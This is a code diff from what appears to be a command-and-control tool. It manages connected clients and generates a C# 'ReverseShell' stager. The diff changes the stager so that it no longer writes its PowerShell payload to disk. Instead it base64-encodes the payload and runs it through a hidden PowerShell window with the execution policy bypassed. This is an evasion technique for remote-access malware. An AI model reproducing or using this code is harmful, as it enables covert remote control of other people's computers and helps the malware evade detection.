@@ -380,7 +380,6 @@ def cli():
                         
                         client_commands[selected_client] = cmd
 #                    print(f"{BLUE}[>] Waiting for response...{RESET}")
-
                     waited = 0
                     timeout = 30  # Max wait time in seconds
                     poll_interval = 0.5
@@ -810,20 +809,21 @@ while ($true) {{
 
         cs_code = f'''using System;
 using System.Diagnostics;
-using System.IO;
+using System.Text;
 
 public class ReverseShell {{
     public static void Main() {{
-        string psFile = "payload.ps1";
         string psScript = @"
 {ps1_script.replace('"', '""')}
 ";
 
+        byte[] scriptBytes = Encoding.Unicode.GetBytes(psScript);
+        string encodedScript = Convert.ToBase64String(scriptBytes);
+
         try {{
-            File.WriteAllText(psFile, psScript);
             Process.Start(new ProcessStartInfo {{
                 FileName = "powershell.exe",
-                Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File " + psFile,
+                Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand " + encodedScript,
                 CreateNoWindow = true,
                 UseShellExecute = false
             }});
